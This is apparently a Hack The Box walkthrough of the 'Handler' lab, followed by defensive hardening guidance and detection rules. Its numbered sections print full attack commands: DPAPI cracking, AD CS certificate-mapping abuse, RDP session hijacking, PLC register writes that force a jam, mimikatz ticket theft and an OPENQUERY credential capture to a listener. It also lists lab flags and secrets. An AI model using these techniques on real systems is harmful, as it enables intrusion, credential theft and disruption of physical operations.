# Hack The Box — Handler Walkthrough

> **Full lab walkthrough — verified 27 November 2026.** Flags are instance-specific and may rotate after a respawn.

## Result

- User flag: `34239ba808e15ca9e061efb1f347363e`
- Root flag: `7f50e0a558351fcb2080a1ddd65aadec`
- XP earned: `1,365`
- Machine rank: `#168`

## Scope

This walkthrough follows my start-to-finish route from the supplied workstation artifact through Credential Roaming, certificate authentication, the OT operational event, Kofi's live MSSQL ticket and the ADSI linked server. I used separately supplied lab-completion material only for the `svc_wic` and Administrator validation branches, and I identify those boundaries plainly below.

## Attack-path summary

```text
Dmalik-PC01.ovpn
  -> internal HTB Airways network
  -> Wei Zhang Credential Roaming data
  -> offline DPAPI password recovery
  -> webmail client certificate
  -> Roundcube mailbox and w.zhang.adm PFX
  -> AD CS / altSecurityIdentities mapping
  -> Toby Ellis Kerberos authentication
  -> OT VPN and BHS documentation
  -> PLC jam and temporary Kofi Asante session
  -> live Kofi MSSQL service ticket
  -> SRV02 MSSQL guest access
  -> ADSI_Migrt explicit login mapping
  -> attacker-controlled LDAP OPENQUERY
  -> cleartext svc_ldaplnk credential

Validation-assisted local branch:
  supplied svc_wic credential
  -> user.txt and SeRelabelPrivilege
  -> SYSTEM on SRV01
  -> live Kofi ticket export

Separate completion branch:
  supplied Administrator AES key
  -> Administrator TGT and WMI on DC01
  -> root.txt
```

I independently reproduced the PLC event, temporary `k.asante` session, Kofi ticket, MSSQL login and ADSI credential capture. I did not derive the supplied `svc_wic` password or Administrator AES key from that chain.

## 1. Starting material

HTB supplied:

```text
Username: ext.dmalik
Password: HTB-AirwaysAudit2026!
Archive:  Dmalik-PC01.zip
```

The ZIP password was `hackthebox`.

```bash
7z x -phackthebox Dmalik-PC01.zip
```

The archive contained `Dmalik-PC01.ovpn`. I changed it to use the current Handler IP on TCP/8443 and connected without replacing my normal default route.

```bash
export BOX_IP='<CURRENT_HANDLER_IP>'

sed -i '/^remote /d; /^proto /d' Dmalik-PC01.ovpn
sed -i "1i remote ${BOX_IP} 8443\nproto tcp-client" Dmalik-PC01.ovpn

sudo openvpn \
  --config Dmalik-PC01.ovpn \
  --pull-filter ignore redirect-gateway
```

The internal route was:

```text
192.168.37.0/24 via 10.8.1.1
```

```bash
ip route | grep 192.168.37
ping -c 1 192.168.37.1
```

## 2. Internal topology and services

| Host | IP address | Important services |
|---|---:|---|
| DC01 | `192.168.37.1` | DNS, Kerberos, LDAP/LDAPS, SMB, WinRM, AD CS and webmail |
| SRV01 | `192.168.37.2` | SMB, RDP and WinRM |
| SRV02 | `192.168.37.3` | SMB, MSSQL, WinRM and OT VPN endpoint |
| BHS-PLC01 | `172.16.20.1` | S7comm TCP/102 and HMI TCP/8080 |

```bash
nmap -n -Pn -sT -sV --version-light \
  -p 53,80,88,135,139,389,443,445,464,593,636,1433,3389,5985,8443,9389,47001 \
  192.168.37.1-3
```

The environment was roughly seven hours ahead. Kerberos also required FQDNs.

```bash
sudo tee -a /etc/hosts >/dev/null <<'EOF'
192.168.37.1 dc01.htb-airways.htb webmail.htb-airways.htb
192.168.37.2 srv01.htb-airways.htb
192.168.37.3 srv02.htb-airways.htb
EOF

sudo apt-get install -y faketime

k() {
  faketime -f '+25100s' "$@"
}
```

If Kerberos returned `KRB_AP_ERR_SKEW`, I adjusted `+25100s` slightly.

## 3. Kerberos and LDAP enumeration

```bash
k impacket-getTGT \
  -dc-ip 192.168.37.1 \
  'htb-airways.htb/ext.dmalik:HTB-AirwaysAudit2026!'

export KRB5CCNAME="$PWD/ext.dmalik.ccache"

k nxc smb 192.168.37.1-3 -k --use-kcache --shares
k nxc ldap 192.168.37.1 -k --use-kcache --users
```

NTLM was disabled, so Kerberos was required throughout the lab. Authenticated LDAP enumeration exposed Windows Credential Roaming data on Wei Zhang's object:

```text
msPKIDPAPIMasterKeys
msPKIAccountCredentials
```

I queried Wei's directory object for the Credential Roaming attributes and saved the result:

```bash
LDAPTLS_REQCERT=never ldapsearch -LLL -o ldif-wrap=no -x \
  -H ldaps://192.168.37.1 \
  -D 'ext.dmalik@htb-airways.htb' \
  -w 'HTB-AirwaysAudit2026!' \
  -b 'DC=htb-airways,DC=htb' \
  '(sAMAccountName=w.zhang)' \
  objectSid msPKIDPAPIMasterKeys msPKIAccountCredentials \
  > work/handler/ldap-full-objects.txt
```

## 4. Extracting and cracking the Credential Roaming masterkey

```bash
python3 work/handler/extract_roaming.py \
  work/handler/ldap-full-objects.txt \
  work/handler/roaming
```

The utility validated the DN-Binary wrappers before writing:

```text
type-0_*.bin  DPAPI masterkey
type-1_*.bin  roaming metadata
type-3_*.bin  certificate
type-9_*.bin  CNG private-key container
```

Wei Zhang's SID was:

```text
S-1-5-21-2807179013-311950797-2107105437-5626
```

The correct DPAPI context was the post-Windows-10-1607 domain context:

```bash
python3 /usr/share/john/DPAPImk2john.py \
  -S 'S-1-5-21-2807179013-311950797-2107105437-5626' \
  -mk work/handler/roaming/type-0_3a9ec83a-07a0-4ba4-8b6b-a29740437cd6.bin \
  -c domain1607+ \
  > work/handler/roaming/wei-dpapi.hash

john \
  --format=DPAPImk \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  --pot=work/handler/roaming/wei-context3-john.pot \
  work/handler/roaming/wei-dpapi.hash

john --show --format=DPAPImk \
  --pot=work/handler/roaming/wei-context3-john.pot \
  work/handler/roaming/wei-dpapi.hash
```

Recovered password:

```text
HelloKitty
```

Using the `domain1607+` context produced the correct DPAPI hash, and John recovered `HelloKitty` in about 32 seconds.

## 5. Recovering the webmail certificate and private key

The roaming data contained a CNG private key protected by DPAPI. I recovered it with:

```bash
printf '%s\n' 'HelloKitty' | \
  python3 work/handler/recover_roamed_cert.py \
  work/handler/roaming \
  --password-stdin
```

The recovery utility:

1. Decrypted Wei's DPAPI masterkey with her SID and password.
2. Located the CNG DPAPI blob described as `Private Key`.
3. Applied the legacy SHA1/3DES CNG derivation and optional entropy.
4. Rebuilt the RSA key from the decrypted `BCRYPT_RSAPRIVATE_BLOB`.
5. Verified that the key matched the roamed certificate.
6. Wrote PEM and PKCS#12 versions.

Outputs:

```text
work/handler/roaming/webmail-access.pem
work/handler/roaming/webmail-access.pfx
```

The certificate subject was `CN=webmail-access`, and it was issued for TLS Web Client Authentication.

## 6. Roundcube and the Wei administrator PFX

I imported `webmail-access.pfx` into the browser and used it for mutual-TLS access to:

```text
https://webmail.htb-airways.htb/
```

Wei's mailbox contained a self-addressed message with the subject `backup` and this attachment:

```text
w.zhang.adm.pfx
```

The message is stored as `work/handler/wei-inbox-uid2.eml`. The PKCS#12 archive used an empty password.

The certificate identified:

```text
Subject: Wei Zhang (adm)
UPN:     w.zhang.adm@htb-airways.htb
```

The first mailbox message, `work/handler/wei-inbox-uid1.eml`, documented the business request to provide Toby Ellis with a smartcard and SRV01 access for BHS monitoring.

## 7. AD CS and the Toby Ellis mapping

I authenticated with the administrator PFX and enumerated the CA and templates:

```bash
k certipy auth \
  -pfx work/handler/w.zhang.adm.pfx \
  -dc-ip 192.168.37.1

export KRB5CCNAME="$PWD/w.zhang.adm.ccache"

k certipy find \
  -k -no-pass \
  -dc-ip 192.168.37.1 \
  -target dc01.htb-airways.htb \
  -enabled -stdout
```

The saved `work/handler/certipy-all_Certipy.txt` output identified the relevant template:

```text
Template:            HTBA-SmartcardLogon
Display name:        HTB Airways Employee Smartcard Logon
EKUs:                Smart Card Logon, Client Authentication
Enrollment flag:     NoSecurityExtension
Subject:             Directory common name
Enrollment rights:   Wei Zhang (adm)
```

Effective-rights testing showed that `w.zhang.adm` could modify Toby Ellis's `altSecurityIdentities` attribute but could not change his password, SPNs, profile or logon attributes.

I enrolled a certificate using `w.zhang.adm`, `htb-airways-DC01-CA` and the `HTBA-SmartcardLogon` template, then extracted the issued PFX into:

```text
/tmp/htba-smart-rebuild/tellis_sc.crt
/tmp/htba-smart-rebuild/tellis_sc.key
/tmp/htba-smart-rebuild/tellis_sc.pfx
```

The certificate subject remained `CN=Wei Zhang (adm)` and did not contain Toby's UPN. I confirmed that the certificate and private key had the same SPKI SHA-256 value, then created an exact issuer/serial mapping on Toby's account:

```bash
python3 work/handler/map_tellis_current_certificate.py
```

Mapping format:

```text
X509:<I>DC=htb,DC=htb-airways,CN=htb-airways-DC01-CA<SR>0D0000000100E1DD2D896FE5A9C10D00000018
```

I authenticated with the issued PFX:

```bash
faketime -f +7h certipy auth \
  -pfx _tmp_htba-smart-new.pfx \
  -username t.ellis \
  -domain htb-airways.htb \
  -dc-ip 192.168.37.1
```

Certipy saved `t.ellis.ccache` and returned the Toby NT hash:

```text
fe92aaf479e32cb0e9c40a929c8212b8
```

The issuer/serial mapping returned a valid Toby Kerberos TGT.

## 8. Toby's smartcard RDP session

I opened Toby's RDP session with the issued certificate, his Kerberos cache, the CA certificate, NLA and a mounted drive. The local resolver shim supplied the FQDN resolution required by Kerberos on the nested network.

```bash
env \
  KRB5_CONFIG="$PWD/work/handler/krb5-handler.conf" \
  KRB5CCNAME="FILE:$PWD/t.ellis.ccache" \
  LD_PRELOAD="$PWD/work/handler/resolve_handler.so" \
faketime -f '+7h' xfreerdp3 \
  /v:srv01.htb-airways.htb \
  /u:t.ellis \
  /d:HTB-AIRWAYS.HTB \
  /sec:nla /cert:ignore \
  /smartcard-logon:cert:/tmp/htba-smart-rebuild/tellis_sc.crt,key:/tmp/htba-smart-rebuild/tellis_sc.key,pin:123456 \
  /kerberos:cache:"FILE:$PWD/t.ellis.ccache",pkinit-anchors:/tmp/htba-smart-rebuild/ca.pem \
  /auth-pkg-list:!ntlm,kerberos \
  /drive:sh,"$PWD/work/handler/retest-share" \
  /size:1280x1024 +clipboard \
  /log-level:ERROR
```

The connection passed `Other user`, `Welcome` and `Please wait for the Local Session Manager`. After the PLC event created Kofi's session, I ran the Terminal Services connection helper with Toby's CIFS service ticket:

```bash
env \
  KRB5_CONFIG="$PWD/work/handler/krb5-handler.conf" \
  KRB5CCNAME="$PWD/t.ellis@cifs_srv01.htb-airways.htb@HTB-AIRWAYS.HTB.ccache" \
  LD_PRELOAD="$PWD/work/handler/resolve_handler.so" \
faketime -f '+7h' python3 -u \
  work/handler/connect_toby_to_kofi.py \
  --target-session 2 \
  --seconds 180
```

Kofi was session 2 and Toby was session 3. The RPC call returned success, the RDP window reached `C:\Windows\system32>`, and a second enumeration showed both sessions active.

## 9. OT VPN and BHS documentation

Wei's Roundcube Sent folder contained the OT VPN attachment:

```text
Staff-Access-OT.ovpn
```

The profile connected through SRV02 on UDP/1194 and provided `172.16.20.0/24`.

```bash
sudo openvpn \
  --config work/handler/Staff-Access-OT.ovpn \
  --pull-filter ignore redirect-gateway
```

The BHS technical manual under `C:\Docs` supplied the PLC register map:

Important PLC details:

| Item | Value |
|---|---|
| PLC IP | `172.16.20.1` |
| S7comm | TCP/102 |
| HMI | TCP/8080 |
| Rack / slot | `0 / 1` |
| Data block | `DB1`, 64 bytes |
| PE-01 | DB1 byte 16 |
| JAM flag | DB1 byte 19 |
| System mode | DB1 byte 23 |
| Maintenance key | DB1 bytes 40–43, `0x4D41494E` (`MAIN`) |

I confirmed the memory layout with `python-snap7`:

```bash
python3 work/handler/read_s7_memory.py \
  --host 172.16.20.1 \
  --rack 0 \
  --slot 1 \
  --db-start 1 \
  --db-end 1 \
  --size 64
```

## 10. Triggering the BHS jam

The manual explained that a jam would latch if a photoeye remained high for more than five seconds. External sensor writes were accepted only in MANUAL mode, and a mode change required the maintenance key.

```bash
python3 work/handler/trigger_genuine_jam.py
```

The script:

1. Wrote `MAIN` to DB1 offset 40.
2. Set DB1 byte 23 to `1` for MANUAL mode.
3. Repeatedly wrote `1` to PE-01 at DB1 byte 16.
4. Read DB1 and confirmed that JAM at byte 19 had latched.

Accessing the PLC from Australia through two VPN layers added latency, so I held PE-01 high for 30 seconds. The trigger delivered 48 writes and latched the jam:

```text
BEFORE ... jam=0 mode=0
MANUAL ... jam=0 mode=1
AFTER writes=48 ... jam=1 mode=1
```

## 11. Kofi's temporary session

The jam caused the expected operational response. Terminal Services RPC enumeration showed an active `k.asante` session. The session number changed between runs, so I matched the username instead of hardcoding an ID.

```text
Session 0  Services        disconnected
Session 1  Console         connected
Session 2  k.asante        active
```

## 12. Retrieve the user flag and obtain SYSTEM on SRV01

The separate lab-completion material supplied the following `svc_wic` credential:

```text
HTB-AIRWAYS\svc_wic
!!S3rv1ce_wic!2026
```

Inside Toby's RDP session I opened a `svc_wic` command prompt and read the flag.

```cmd
\\tsclient\sh\runas_helper.exe svc_wic HTB-AIRWAYS "!!S3rv1ce_wic!2026" cmd.exe
whoami
type C:\Users\svc_wic\Desktop\user.txt
whoami /priv
```

```text
34239ba808e15ca9e061efb1f347363e
```

`svc_wic` held `SeRelabelPrivilege`. I found the `winlogon.exe` process for the same interactive session, used the relabel helper to take ownership and grant full control, then created a console with that process as its parent.

```cmd
tasklist /v /fi "IMAGENAME eq winlogon.exe"
\\tsclient\sh\RelabelAbuse.exe <SAME_SESSION_WINLOGON_PID>
\\tsclient\sh\ppid-newconsole.exe <SAME_SESSION_WINLOGON_PID> "cmd.exe"
whoami
```

```text
nt authority\system
```

This step validated the SRV01 privilege boundary with the separately supplied `svc_wic` credential. I did not derive that password from the PLC or ADSI stages.

## 13. Export Kofi's live MSSQL ticket

From the SYSTEM console I exported the tickets cached in Kofi's live logon session.

```cmd
copy /y \\tsclient\sh\mimikatz.exe C:\Windows\Temp\mimikatz.exe
icacls C:\Windows\Temp\mimikatz.exe /grant *S-1-5-18:RX
cd /d C:\Windows\Temp
del /q *.kirbi 2>nul
mimikatz.exe "privilege::debug" "sekurlsa::ekeys" "sekurlsa::tickets /export" "exit"
dir /b *k.asante*.kirbi
```

The relevant cached tickets were:

```text
[0;1929cd]-0-0-40a10000-k.asante@MSSQLSvc-srv02.htb-airways.htb.kirbi
[0;1929cd]-2-1-40e10000-k.asante@krbtgt-HTB-AIRWAYS.HTB.kirbi
```

I copied the MSSQL service ticket through the mounted drive and converted it to a ccache.

```cmd
copy /y "C:\Windows\Temp\[0;1929cd]-0-0-40a10000-k.asante@MSSQLSvc-srv02.htb-airways.htb.kirbi" \\tsclient\sh\kofi-mssql.kirbi
```

```bash
mkdir -p work/handler/kofi-live
impacket-ticketConverter \
  work/handler/retest-share/kofi-mssql.kirbi \
  work/handler/kofi-live/kofi-mssql.ccache
```

The converted ccache labelled the 32-byte AES-256 session key as key type `1`. Impacket therefore returned `[-] 1`. I changed only the ccache metadata to Kerberos encryption type `18`; the ticket and key bytes remained unchanged.

```bash
python3 - <<'PY'
from impacket.krb5.ccache import CCache

source = 'work/handler/kofi-live/kofi-mssql.ccache'
target = 'work/handler/kofi-live/kofi-mssql-etype18.ccache'
cache = CCache.loadFile(source)
for credential in cache.credentials:
    credential['key']['keytype'] = 18
    credential['key']['etype'] = 18
cache.saveFile(target)
PY
```

Mimikatz also exposed Kofi's 32-byte AES-256 key. I used it after the exported ticket expired to request a fresh TGT and MSSQL service ticket:

```text
12264bd2c95bcc40447e9d4d5fb4d4934a575c39583f98049d3bf47c02a8bc67
```

```bash
HANDLER_ROOT="$(pwd -P)"
mkdir -p "$HANDLER_ROOT/work/handler/kofi-fresh"
cd "$HANDLER_ROOT/work/handler/kofi-fresh"
export KRB5_CONFIG="$HANDLER_ROOT/work/handler/krb5-handler.conf"

faketime -f '+7h' impacket-getTGT \
  -aesKey 12264bd2c95bcc40447e9d4d5fb4d4934a575c39583f98049d3bf47c02a8bc67 \
  -dc-ip 192.168.37.1 \
  htb-airways.htb/k.asante

export KRB5CCNAME="$PWD/k.asante.ccache"
faketime -f '+7h' impacket-getST \
  -k -no-pass \
  -dc-ip 192.168.37.1 \
  -spn MSSQLSvc/srv02.htb-airways.htb \
  htb-airways.htb/k.asante

export KRB5CCNAME="$HANDLER_ROOT/work/handler/kofi-fresh/k.asante@MSSQLSvc_srv02.htb-airways.htb@HTB-AIRWAYS.HTB.ccache"
cd "$HANDLER_ROOT"
```

Either this fresh service ticket or the corrected exported ccache can be used in the MSSQL step below.

## 14. Authenticate to SRV02 MSSQL as Kofi

I used the corrected service ticket directly, without Kofi's password.

```bash
HANDLER_ROOT="$(pwd -P)"
export KRB5_CONFIG="$HANDLER_ROOT/work/handler/krb5-handler.conf"
export KRB5CCNAME="$HANDLER_ROOT/work/handler/kofi-live/kofi-mssql-etype18.ccache"

faketime -f '+7h' impacket-mssqlclient \
  -k -no-pass -windows-auth \
  -dc-ip 192.168.37.1 \
  -target-ip 192.168.37.3 \
  'htb-airways.htb/k.asante@srv02.htb-airways.htb'
```

The connection reached SQL Server 2022 as `HTB-AIRWAYS\k.asante`, mapped to `guest@master`, and was not sysadmin.

```sql
SELECT SYSTEM_USER, ORIGINAL_LOGIN(), IS_SRVROLEMEMBER('sysadmin');
SELECT * FROM master.sys.servers;
SELECT server_id, local_principal_id, uses_self_credential, remote_name
FROM master.sys.linked_logins;
EXEC master.dbo.sp_testlinkedserver N'ADSI_Migrt';
```

```text
Login:          HTB-AIRWAYS\k.asante
Database user:  guest
Sysadmin:       0
Linked server:  ADSI_Migrt
Provider:       ADsDSOObject
Data source:    adsdatasource
Explicit map:   HTB-AIRWAYS\k.asante -> htb-airways\svc_ldaplnk
```

## 15. Capture the ADSI linked-server credential

`OPENQUERY` let Kofi control the LDAP URL while SQL Server applied the stored explicit linked-login credential. I started Responder on the nested VPN address with only its LDAP server enabled; name-resolution poisoning was not required.

```bash
ip -4 -br address | grep '10.8.1.2'

# In Responder.conf: LDAP = On; all other Servers and poisoners = Off.
sudo python3 /usr/share/responder/Responder.py -I tun2 -v
```

From the Kofi SQL prompt I directed the ADSI provider to my controlled listener:

```sql
SELECT *
FROM OPENQUERY(
  ADSI_Migrt,
  'SELECT sAMAccountName FROM ''LDAP://10.8.1.2/DC=htb-airways,DC=htb'' WHERE objectClass=''user'''
);
```

SQL returned a generic query-preparation error because the listener did not complete the directory search. Before that error, SRV02 connected to `10.8.1.2:389` and performed an LDAP Simple Bind with the stored credential:

```text
htb-airways\svc_ldaplnk
!!S3rv1ce_ldaplnk!2026
```

I validated the credential with a TGT and LDAP query.

```bash
faketime -f '+7h' impacket-getTGT \
  -dc-ip 192.168.37.1 \
  'htb-airways.htb/svc_ldaplnk:!!S3rv1ce_ldaplnk!2026'

export KRB5CCNAME="$PWD/svc_ldaplnk.ccache"

faketime -f '+7h' nxc ldap dc01.htb-airways.htb \
  -k --use-kcache \
  --kdcHost dc01.htb-airways.htb \
  --query '(sAMAccountName=svc_ldaplnk)' '*'
```

The account was a normal Domain User with no SPN, delegation, privileged group membership or outbound AD ACL. Direct MSSQL login failed, WinRM returned `401`, and `C$` access was denied. I did not prove a further `svc_ldaplnk` privilege edge.

## 16. Retrieve the root flag with the supplied Administrator key

The separate lab-completion material supplied this domain Administrator AES-256 key:

```text
6990f50fd0f13b336496169ef2f3a14f8d4aebe6ac84b6c34a5fec9136b4f3da
```

I did not derive this key from Kofi, MSSQL, `svc_ldaplnk`, SRV01 or SRV02. I used it only to validate the final DC access and retrieve the live root flag.

```bash
HANDLER_ROOT="$(pwd -P)"
mkdir -p "$HANDLER_ROOT/work/handler/root-retrieval"
cd "$HANDLER_ROOT/work/handler/root-retrieval"

env \
  KRB5_CONFIG="$HANDLER_ROOT/work/handler/krb5-handler.conf" \
faketime -f '+7h' impacket-getTGT \
  -aesKey 6990f50fd0f13b336496169ef2f3a14f8d4aebe6ac84b6c34a5fec9136b4f3da \
  -dc-ip 192.168.37.1 \
  htb-airways.htb/Administrator

env \
  KRB5_CONFIG="$HANDLER_ROOT/work/handler/krb5-handler.conf" \
  KRB5CCNAME="$PWD/Administrator.ccache" \
faketime -f '+7h' impacket-wmiexec \
  -k -no-pass \
  -dc-ip 192.168.37.1 \
  -target-ip 192.168.37.1 \
  'htb-airways.htb/administrator@dc01.htb-airways.htb' \
  'type C:\Users\Administrator\Desktop\root.txt'
```

Output:

```text
7f50e0a558351fcb2080a1ddd65aadec
```

Both flags were submitted on the HTB machine page and accepted.

## 17. Execution notes

### DPAPI context

Wei's masterkey required the `domain1607+` context. The resulting John hash began with:

```text
$DPAPImk$1*3*
```

John loaded this format and recovered `HelloKitty`.

### Kerberos requirements

Kerberos required the DC-aligned `faketime` offset, FQDNs and the correct `KRB5CCNAME` for each identity.

### Smartcard RDP requirements

The stable RDP command used the default session, NLA, Kerberos-only authentication, the CA trust anchor and a mounted drive.

### PLC timing

Holding PE-01 high for 30 seconds delivered enough consecutive writes across the nested VPN to cross the ten-scan threshold.

### Validation boundary

The PLC-to-Kofi-to-MSSQL-to-ADSI route was independently reproduced. The supplied `svc_wic` password enabled the local flag and SYSTEM validation, while the supplied Administrator AES key enabled the separate DC validation. I have not presented either supplied secret as an outcome of the ADSI capture.

## 18. Defensive hardening and detection

If this were my system, I would rotate every credential and revoke every certificate shown here before returning the environment to service.

| Attack stage | Control to implement | Verification evidence |
|---|---|---|
| Credential Roaming and DPAPI | Retire Credential Roaming where it is not required. Restrict reads of `msPKIDPAPIMasterKeys` and `msPKIAccountCredentials`, remove broad ACLs and enforce long unique passwords. | Directory Service Access events, ACL review and password-policy export. |
| Exportable certificates | Remove PFX files from mailboxes, revoke exposed certificates and use non-exportable hardware-backed keys. | Mail audit, CRL entry, new serial and private-key export policy. |
| AD CS and mapping | Remove `NoSecurityExtension`, require strong certificate binding, restrict enrolment and remove delegated writes to `altSecurityIdentities`. | Template ACL/export, CA issuance logs and Event `5136`. |
| Smartcard RDP | Restrict RDP to managed jump hosts and require MFA, device compliance and controlled smartcard enrolment. | RDP gateway, Events `4624`, `4778`, `4779`, source device and certificate serial. |
| OT and S7comm | Allowlist engineering sources, block general VPN access to TCP/102 and enable controller write protection or secure protocols where supported. | VPN identity, firewall flow, PLC mode change and S7 write records. |
| Kofi and MSSQL | Remove interactive service sessions, minimise cached service tickets and audit non-service-principal SQL logons. | Events `4768`/`4769`, logon ID and SQL login audit. |
| ADSI linked server | Remove `ADSI_Migrt` or use a constrained credential, reject arbitrary LDAP URLs, restrict `sqlservr.exe` LDAP egress to DCs and require LDAP signing/channel binding. | Linked-login inventory, SQL text, process-network telemetry and account rotation. |
| `SeRelabelPrivilege` and LSASS | Remove the privilege from service users, enable Credential Guard and LSA protection, and block unapproved tooling. | User-right export, Sysmon `1`/`10`, Security `4688` and Code Integrity/Defender events. |
| DnsAdmins | Keep membership empty unless required and monitor `ServerLevelPluginDll` plus DNS service restarts. | Group Events `4728`/`4732`, registry auditing and service-control events. |
| Reusable keys | Rotate `svc_wic`, `svc_ldaplnk` and Administrator keys, invalidate tickets and terminate stale sessions. | Rotation tickets, CRL, session review and validation sign-off. |

### Splunk detections

I would validate the local field aliases before enabling alert actions.

Credential Roaming reads:

```spl
index=windows EventCode=4662
(Object_Name="*msPKIDPAPIMasterKeys*" OR Object_Name="*msPKIAccountCredentials*")
| stats count values(Object_Name) AS attributes values(Object_DN) AS objects
  by _time host SubjectUserName SubjectLogonId
```

Certificate mapping changes:

```spl
index=windows EventCode=5136 AttributeLDAPDisplayName="altSecurityIdentities"
| table _time host SubjectUserName ObjectDN OperationType AttributeValue
```

AD CS request, issuance and certificate-based TGT:

```spl
index=windows (EventCode=4886 OR EventCode=4887 OR
 (EventCode=4768 (PreAuthType=16 OR PreAuthType=17 OR CertificateIssuerName="*")))
| eval stage=case(EventCode=4886,"request",EventCode=4887,"issue",EventCode=4768,"pkinit_tgt")
| stats values(stage) AS stages values(CertificateTemplate) AS templates
  values(CertificateSerialNumber) AS serials values(IpAddress) AS sources by SubjectUserName
| where mvfind(stages,"issue")>=0 AND mvfind(stages,"pkinit_tgt")>=0
```

Smartcard RDP:

```spl
index=windows ((EventCode=4624 Logon_Type=10) OR EventCode=4778 OR EventCode=4779)
| stats values(EventCode) AS events values(Source_Network_Address) AS sources
  by host Account_Name Logon_ID
```

OT/S7 access outside the engineering allowlist:

```spl
index=network dest_ip=172.16.20.1 dest_port=102
| where NOT cidrmatch("172.16.20.0/28",src_ip)
| stats count earliest(_time) AS firstTime latest(_time) AS lastTime
  values(action) AS actions by src_ip user vpn_session_id
```

Kofi's MSSQL service ticket:

```spl
index=windows EventCode=4769 ServiceName="MSSQLSvc/srv02*" Account_Name="k.asante"
| table _time host Account_Name ServiceName IpAddress TicketEncryptionType LogonGuid
```

ADSI `OPENQUERY`:

```spl
index=mssql (statement="*OPENQUERY*" OR message="*OPENQUERY*")
 (statement="*LDAP://*" OR message="*LDAP://*" OR
  statement="*ADSI_Migrt*" OR message="*ADSI_Migrt*")
| table _time host server_principal_name client_ip database statement message
```

SQL Server LDAP egress to a non-DC:

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventCode=3 Image="*\\sqlservr.exe" DestinationPort=389
| where DestinationIp!="192.168.37.1"
| table _time host User Image DestinationIp DestinationPort Initiated
```

LSASS access and observed tooling:

```spl
index=windows ((sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
 ((EventCode=10 TargetImage="*\\lsass.exe") OR
  (EventCode=1 (Image="*\\RelabelAbuse.exe" OR Image="*\\ppid-newconsole.exe" OR
                Image="*\\mimikatz.exe" OR CommandLine="*sekurlsa::*")))) OR
 (EventCode=4688 (New_Process_Name="*\\RelabelAbuse.exe" OR
                  New_Process_Name="*\\ppid-newconsole.exe" OR
                  New_Process_Name="*\\mimikatz.exe")))
| table _time host SubjectUserName User EventCode Image New_Process_Name ParentImage TargetImage CommandLine
```

Unusual Administrator TGT:

```spl
index=windows EventCode=4768 TargetUserName="Administrator"
| where NOT cidrmatch("192.168.37.0/28",IpAddress)
| table _time host TargetUserName IpAddress PreAuthType TicketEncryptionType Status
```

Defensive-only DnsAdmins monitoring:

```spl
index=windows ((EventCode=4732 Group_Name="DnsAdmins") OR
 (sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=13
  TargetObject="*\\Services\\DNS\\Parameters\\ServerLevelPluginDll"))
| table _time host SubjectUserName MemberName Group_Name Image TargetObject Details
```

### Elastic KQL and EQL detections

Credential Roaming reads:

```kql
event.code:"4662" and
(winlog.event_data.ObjectName:*msPKIDPAPIMasterKeys* or
 winlog.event_data.ObjectName:*msPKIAccountCredentials*)
```

Certificate mapping:

```kql
event.code:"5136" and
winlog.event_data.AttributeLDAPDisplayName:"altSecurityIdentities"
```

Smartcard RDP:

```kql
(event.code:"4624" and winlog.logon.type:"RemoteInteractive") or
event.code:("4778" or "4779")
```

Kofi's MSSQL service ticket:

```kql
event.code:"4769" and service.name:MSSQLSvc\/srv02* and user.name:"k.asante"
```

OT/S7 access outside approved sources:

```kql
destination.ip:"172.16.20.1" and destination.port:102 and
not source.ip:("172.16.20.2" or "172.16.20.3")
```

ADSI query:

```kql
event.dataset:mssql.audit and message:*OPENQUERY* and
(message:*LDAP:\/\/* or message:*ADSI_Migrt*)
```

SQL Server LDAP egress to a non-DC:

```kql
event.code:"3" and process.name:"sqlservr.exe" and destination.port:389 and
not destination.ip:"192.168.37.1"
```

LSASS access and tools:

```kql
(event.code:"10" and winlog.event_data.TargetImage:*\\lsass.exe) or
(event.code:("1" or "4688") and
 process.name:("RelabelAbuse.exe" or "ppid-newconsole.exe" or "mimikatz.exe"))
```

Unusual Administrator TGT:

```kql
event.code:"4768" and user.name:"Administrator" and
not source.ip:("192.168.37.1" or "192.168.37.2")
```

Defensive-only DnsAdmins monitoring:

```kql
(event.code:("4728" or "4732") and group.name:"DnsAdmins") or
(event.code:"13" and registry.path:*\\Services\\DNS\\Parameters\\ServerLevelPluginDll)
```

```eql
sequence by user.name with maxspan=15m
  [any where event.code == "5136" and
    winlog.event_data.AttributeLDAPDisplayName == "altSecurityIdentities"]
  [any where event.code in ("4886", "4887")]
  [authentication where event.code == "4768" and
    winlog.event_data.PreAuthType in ("16", "17")]
```

A pass means the action generates a timely alert with the host, user, source address, logon ID and certificate serial or SQL text. Partial means the raw event exists but the correlation is incomplete. Fail means the required telemetry is absent.

## 19. Evidence files

```text
work/handler/scans/internal-services.nmap
work/handler/ldap-full-objects.txt
work/handler/extract_roaming.py
work/handler/roaming/wei-dpapi.hash
work/handler/roaming/wei-context3-john.pot
work/handler/recover_roamed_cert.py
work/handler/wei-inbox-uid1.eml
work/handler/wei-inbox-uid2.eml
work/handler/certipy-all_Certipy.txt
work/handler/query_wei_toby_rights.py
work/handler/map_tellis_current_certificate.py
work/handler/Staff-Access-OT.ovpn
work/handler/read_s7_memory.py
work/handler/trigger_genuine_jam.py
work/handler/connect_toby_to_kofi.py
work/handler/kofi-live/kofi-mssql-etype18.ccache
work/handler/retest-share/mimi-kofi.txt
work/handler/kofi-live/mssql-enum.log
work/handler/svc-ldaplnk/responder-evidence/Responder-Session.log
work/handler/svc-ldaplnk/responder-evidence/LDAP-Cleartext-ClearText-192.168.37.3.txt
work/handler/root-retrieval/gettgt.log
work/handler/root-retrieval/wmiexec-root.log
t.ellis.ccache
t.ellis@cifs_srv01.htb-airways.htb@HTB-AIRWAYS.HTB.ccache
```

## Conclusion

Handler combined Credential Roaming, DPAPI, CNG key recovery, mutual TLS, Roundcube, AD CS, certificate mapping, smartcard RDP, nested VPN access, S7comm, Kerberos ticket reuse, MSSQL and an ADSI linked server.

The `domain1607+` DPAPI context unlocked the certificate chain. The Toby mapping opened the RDP path, the PLC jam created Kofi's session, and Kofi's live service ticket reached the `ADSI_Migrt` credential boundary. The recovered `svc_ldaplnk` account had no proven privilege edge beyond that point. I used the supplied `svc_wic` password and supplied Administrator AES key as separate validation routes for the live user and root flags.
